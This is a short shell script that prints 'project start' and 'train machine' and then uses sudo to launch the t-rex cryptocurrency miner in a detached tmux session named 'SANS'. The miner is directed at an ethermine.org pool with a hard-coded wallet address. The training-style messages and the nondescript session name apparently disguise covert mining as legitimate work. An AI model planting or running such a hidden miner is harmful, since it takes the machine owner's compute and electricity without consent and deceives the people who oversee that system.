echo project start
echo train machine
chmod +x t-rex
sudo tmux new-session -d -s SANS './t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w rig0 --lock-cclock 1200'
